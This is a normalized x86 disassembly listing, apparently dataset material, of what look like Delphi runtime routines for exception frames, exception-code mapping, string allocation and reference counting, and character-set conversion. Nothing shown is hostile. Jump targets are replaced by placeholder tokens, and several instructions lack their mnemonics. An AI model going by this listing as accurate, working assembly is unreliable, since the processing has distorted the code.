push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_406000
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403560
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402b10
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4038c0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_4035a8
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4038f8
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403eb0
sub_403920
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_406000
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_40316c
call sub_403508
sub_403974
call sub_406000
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_40316c
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_4035d0
jmp edx
sub_4039bc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027e0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403b1c
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403b44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403b8a
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403ba4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403bea
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403c44
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_405d94
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c68
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_405d94
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403c90
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403cb4
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403d10
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403d40
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_40124c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_401204
push eax
call sub_401224
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_401204
push eax
call sub_401224
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_403dcc
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403cb4
call sub_403d40
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403b44
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403b1c
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405860
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403d10
push eax
call sub_401264
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_403ebc
push ebp
mov ebp esp
call sub_4030a0
push ebp
xor ecx ecx
push r-xdata
mov edx [ fs : ecx ]
push edx
mov [ fs : ecx ] esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
call sub_4026fc
pop edx
pop eax
call edx
xor edx edx
pop ecx
mov [ fs : edx ] ecx
pop ecx
pop ebp
pop ebp
retn 0x4
sub_403ef4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026dc
mov [ eax ] edi
mov edx [ ebp + 0x10 ]
mov [ eax + 0x4 ] edx
mov [ rw-data ] 0x1
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax sub_403ebc
push eax
push esi
push ebx
call sub_401234
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_403f40
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4026fc
pop eax
sub_403f64
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403f94
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_404004
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_403fd8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4026fc
sub_404004
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4026dc
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404030
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_404004
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_403f40
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4028d8
sub_404060
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404080
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call MultiByteToWideChar
pop ebp
retn 0x4
sub_40409c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_403f40
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_40458c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404060
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404060
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40458c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404030
jmp r-xdata
sub_404138
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404030
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404168
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40409c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4041b0
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404030
not ecx
sub_4041dc
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4028d8
pop ebx
retn
mov ecx ebx
sub_404208
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_403f94
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_40458c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_40458c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4028d8
pop edi
pop esi
pop ebx
retn
sub_40424c
test edx edx
je r-xdata
mov edx ecx
jmp sub_403f94
test ecx ecx
je sub_403f94
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_404208
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_404004
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4028d8
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4028d8
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_403f94
pop edx
pop eax
jmp sub_404208
call sub_403f94
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4042c0
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_404004
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_40458c
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4028d8
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_403f94
dec [ edx - 0x8 ]
sub_40434c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_40440c
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_404004
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4028d8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4026fc
sub_404460
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_403f40
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404030
jmp r-xdata
pop ebx
retn 0x4
sub_4044a0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_40440c#2
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4028d8
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_40458c
mov edi ecx
sub_4044e8
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_40458c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028d8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028d8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404544
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_40458c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_403f40
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_404004
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40271c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028d8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404638
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_40465c
test edx edx
je sub_404620
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_404620
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
retn
sub_404680
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404620
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404868
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404080
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404080
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404868
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_40470c
jmp r-xdata
sub_40470c
test ecx ecx
je sub_404620
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404730
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40470c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404798
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_40481c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_40478c
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_40470c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404868
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_404610
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4045f8
mov ebx eax
mov eax [ edi ]
call sub_40478c
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028d8
mov eax esi
sub_4048ac
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4048dc
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4048dc
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4048dc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_4048ac
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402838
sub_40497c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4049c8
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4049c8
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f64
jmp r-xdata
call sub_403f40
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404638
jmp r-xdata
call sub_404620
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_4049b0
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
